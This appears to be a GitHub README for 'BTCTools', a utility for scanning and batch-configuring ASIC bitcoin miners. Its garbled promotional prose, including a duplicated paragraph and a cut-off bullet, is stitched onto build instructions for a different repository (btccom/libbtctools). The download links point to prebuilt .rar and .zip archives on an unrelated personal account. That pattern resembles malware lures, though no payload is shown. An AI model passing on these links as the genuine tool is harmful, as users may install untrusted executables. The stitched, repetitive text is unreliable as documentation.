# BTCTools - Managing your ASIC miners (Windows/Linux/MacOS)

![image](https://user-images.githubusercontent.com/98730417/212393342-d2d20630-f24b-4158-bedc-a0104213fc10.png)

BTC Tools is one of the best and convenient tools for managing your ASIC miner batches. The program allows you to scan Antminer Bitmain miners, sort them, as well as perform batch setup and reload equipment. The program is easy to use, and is suitable for both beginners and experienced miners… 
It can build on Windows, Linux and macOS, as dynamic or static library.

Many people who are professionally mining nowadays do not understand how to find their ASIC on the network. Basically, such a problem exists for novice miners, but for professionals, the program that will be discussed is irreplaceable as never before, since it simplifies the search process.

In general, many have such a problem, after purchasing an ASIC, and given that the problem is not so large-scale, since not a very large number of people are interested in this topic, then find information on finding an ASIC, as well as how to connect to it by IP and the most the main thing is to correctly configure all equipment. Actually, in this article you will get acquainted with a utility called BTC Tools and learn how to download it, install it on your mining equipment, as well as where to download btc tools on your computer to solve such a sensitive problem as finding an ASIC, so that you can then configure it and earn your own money in the maximum amount on bitcoins.

+ [Download BTCTools v1.3.3 for for Windows/Linux/MacOS](https://github.com/Sanberstav/BTCTools/releases/download/BTCTools-v1.3.3/BTCTool_v.1.3.3.rar)
+ [Download SetMinersStaticIP v1.3.4 for Windows/Linux/MacOS](https://github.com/Sanberstav/BTCTools/releases/download/BTCTools-v1.3.3/Set.Miners.Static.IP.v1.3.4.win.zip)
------------------------------------------------

## BTC Tools features, introduces the following features:
+ Scanning miners belonging to several network segments in the local network. Displays basic information about miners such as hash rate, temperature, fan speed, pool, worker name, etc.
+ Sorting miners by each field like hash rate, temperature, worker name, etc. You can easily spot abnormal miners with low hash rate or high temperature, etc.
+ With the help of the “Miner Monitoring” function, BTC Tools can constantly update the information of miners. You can quickly find abnormal miners who combine this feature with sorting.
+ Batch setup of miners with their pools, worker names (sub-account.miner-postfix) and passwords or mining difficulties. You can configure all miners or only selected miners.
+ Batch reboot of miners. You can reload all miners or only selected miners.
+ Batch firmware update for all or selected miners.
+ Batch control of miner’s power consumption in L
+ Batch control of the miner’s frequency in overclocking or overclocking mode (available only for Antminer firmware with the “Mode” or “Working mode” drop-down list on the configuration page)
+ Support for most Antminers and part of Avalon miners, including AntminerS17, T17, S9, S7, T9, etc., as well as AvalonA8, A7, A6, etc. (Reboot function is only available for Antminers, scan and configure is available as with Antminers and Avalon Miners.)

## How to use BTCTool
Important! It is worth noting one important feature, which is that to search for an ASIC, you need the ASIC and the computer where you actually launched the program to work on the same network, that is, for example, if you have a wireless wi-fi, then then both the ASIC and the computer must be connected to this wi-fi network.
![image](https://user-images.githubusercontent.com/98730417/212392676-a6c38134-f0e9-46c1-ac4c-72acdd93d8cd.png)
+ Extract the compressed package you downloaded and then double-click the extracted “BTC Tools.exe”.
BTCTool
+ BTC Tools will automatically import the current computer network segment as IP scan range. If the IP range is correct, you can click the Scan Miner button to start scanning the miners.
+ If the IP address range is incorrect, you can double-click or right-click the item in the IP Address Range box to make changes. You can also click “+” to add a new range of IP addresses, or “-” to remove.

## Search for ASICs using Tools.
Then, to search for ASICs, you should click on the “Scan” button, the field of which will search for ASICs. As the program runs, the progress in the bar next to the button will change. All this time, the program will scan the network, loading it, which is why it is worth turning off all programs and unnecessary devices from this network so as not to load the network and so that the check (scan) is successful.
![image](https://user-images.githubusercontent.com/98730417/212393216-861cd3df-6a17-429b-943f-a257ee68eb04.png)

## BTC Tools
In the process of searching for devices, ASICs will be displayed in the list below. In the list you can see the IP, ASIC status, name, operation mode, two ASIC hash rate values that were found during the search. In addition, there is information on the heating temperature of the ASICs, the rotation speed of the fans, the operating time of the ASICs in the active mining mode, as well as the addresses of the pools and walkers to which the ASICs are actually connected.

In the process of searching for devices, ASICs will be displayed in the list below. In the list you can see the IP, ASIC status, name, operation mode, two ASIC hash rate values that were found during the search. In addition, there is information on the heating temperature of the ASICs, the rotation speed of the fans, the operating time of the ASICs in the active mining mode, as well as the addresses of the pools and walkers to which the ASICs are actually connected …

The main essence of the program is that you can configure your ASICs from any device and geographic location.

## Dependency
There are 4 dependencies:
* Boost 1.59 or later (1.65 or later is validated and recommended)
* OpenSSL (both 1.0 or 1.1 are OK)
* Lua-5.1 or LuaJIT-2.0 (LuaJIT is recommended but incompatibly with macOS)
* Crypto++ (5.6.5 or later)
And `libpthread` is required on Linux and macOS.

## Build on Linux
Example on Ubuntu 18.04 x64:
```bash
### build tools
apt-get install -y build-essential autotools-dev libtool autoconf automake pkg-config cmake gcc g++

### install boost via apt
apt install libboost-all-dev

### or build boost 1.65 if you want (optional)
wget https://dl.bintray.com/boostorg/release/1.65.1/source/boost_1_65_1.tar.gz
tar zxf boost_1_65_1.tar.gz
cd boost_1_65_1
./bootstrap.sh
./b2
./b2 install

### install other dependencies
apt update
apt install libssl-dev libluajit-5.1-dev libcrypto++-dev

### clone and build
git clone https://github.com/btccom/libbtctools.git
cd libbtctools
mkdir build
cd build

### build as static library
cmake -DCMAKE_INSTALL_PREFIX=/opt/btctools -DBTCTOOLS__LIB_TYPE=STATIC ..
make
make install

### or build as dynamic library
cmake -DCMAKE_INSTALL_PREFIX=/opt/btctools -DBTCTOOLS__LIB_TYPE=SHARED ..
make
make install

### running demos
cd /opt/btctools/bin/btctools
./ipGeneratorDemo
./scanMinerDemo
./configMinerDemo
./rebootMinerDemo
```

## Build on macOS
It seems like build on Linux. Search and install dependencies with `brew` first.

Tips: install `lua-5.1` instead of `luajit-2.0`. The demo will segmentation fault with `luajit-2.0` and I don't know the reason.

The command will be:
```bash
brew install cmake boost openssl lua@5.1 cryptopp

### static library
cmake -DCMAKE_INSTALL_PREFIX=/opt/btctools -DBTCTOOLS__LIB_TYPE=STATIC -DBTCTOOLS__LUA_TYPE=NORMAL ..

### or dynamic library
cmake -DCMAKE_INSTALL_PREFIX=/opt/btctools -DBTCTOOLS__LIB_TYPE=SHARED -DBTCTOOLS__LUA_TYPE=NORMAL ..

### build & install
make
make install
```

## Build on Windows

### Install Visual Studio

Please install the C/C++ Development Kit with Visual Studio.

See https://visualstudio.microsoft.com/ for more details.

### Install CMake

See https://cmake.org/download/ for more details.

### Install vcpkg

See https://github.com/Microsoft/vcpkg/ for more details.


## Quick Steps:
```
git clone https://github.com/Microsoft/vcpkg.git
cd vcpkg
.\bootstrap-vcpkg.bat
.\vcpkg integrate install
```

Example output for `.\vcpkg integrate install`:

> PS G:\work\vcpkg> .\vcpkg integrate install
> Applied user-wide integration for this vcpkg root.
> 
> All MSBuild C++ projects can now #include any installed libraries.
> Linking will be handled automatically.
> Installing new libraries will make them instantly available.
> 
> CMake projects should use: "-DCMAKE_TOOLCHAIN_FILE=G:/work/vcpkg/scripts/buildsystems/vcpkg.cmake"

### install packages via vcpkg


#### 32bit
```
.\vcpkg install boost:x86-windows-static openssl:x86-windows-static cryptopp:x86-windows-static luajit:x86-windows-static
```

#### 64bit
```
.\vcpkg install boost:x64-windows-static openssl:x64-windows-static cryptopp:x64-windows-static luajit:x64-windows-static
```

### cmake & build

#### 32bit
```
md build.32
cd build.32
cmake -DCMAKE_BUILD_TYPE=Release -A win32 -DCMAKE_TOOLCHAIN_FILE=G:/work/vcpkg/scripts/buildsystems/vcpkg.cmake -DVCPKG_TARGET_TRIPLET=x86-windows-static -DBTCTOOLS__STATIC_LINKING_VC_LIB=ON -DBTCTOOLS__LIB_TYPE=STATIC -DCMAKE_INSTALL_PREFIX=G:\work\lib32\btctools ..
start libbtctools.sln
```

#### 64bit
```
md build.64
cd build.64
cmake -DCMAKE_BUILD_TYPE=Release -A x64 -DCMAKE_TOOLCHAIN_FILE=G:/work/vcpkg/scripts/buildsystems/vcpkg.cmake -DVCPKG_TARGET_TRIPLET=x64-windows-static -DBTCTOOLS__STATIC_LINKING_VC_LIB=ON -DBTCTOOLS__LIB_TYPE=STATIC -DCMAKE_INSTALL_PREFIX=G:\work\lib64\btctools ..
start libbtctools.sln
```

Replace `G:/work/vcpkg/scripts/buildsystems/vcpkg.cmake` to your `vcpkg.cmake` path.

Replace `G:\work\lib[32|64]\btctools` to the install path what you want.

Select **Release** instead of the default **Debug** in the build type drop-down box, then build the **INSTALL** project to install.
